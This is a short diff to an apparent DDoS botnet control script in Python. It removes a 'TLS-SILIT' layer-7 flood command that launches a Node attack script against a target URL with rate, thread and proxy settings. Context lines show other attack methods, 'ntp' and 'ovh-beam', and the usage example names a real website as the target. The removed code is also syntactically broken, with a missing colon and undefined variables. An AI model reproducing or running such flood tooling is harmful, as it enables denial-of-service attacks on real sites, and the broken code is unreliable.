@@ -601,17 +601,7 @@ def main():
                 print('Example: ntp 1.1.1.1 22 250 60')
 
 # LAYER 7 METHODS
-      elif "TLS-SILIT" in cnc:
-        try:
-        url = cnc.split()[1]
-        time = cnc.split()[2]
-        rate = cnc.split()[3]
-        threads = cnc.split()[4]
-        proxy = cnc.split()[5]
-        os.system(f'node TLS-SILIT.js {TARGET} {TIME} {RATE} {THREAD} {PROXY}')
-        except IndexError
-           print('Usage: TLS-SILIT url [time] [rate] [threads] [proxy]')
-           print('example: TLS-SILIT www.yandex.com/ 120 5000 20000 proxies.txt')
+    
         
  
         elif "ovh-beam" in cnc:
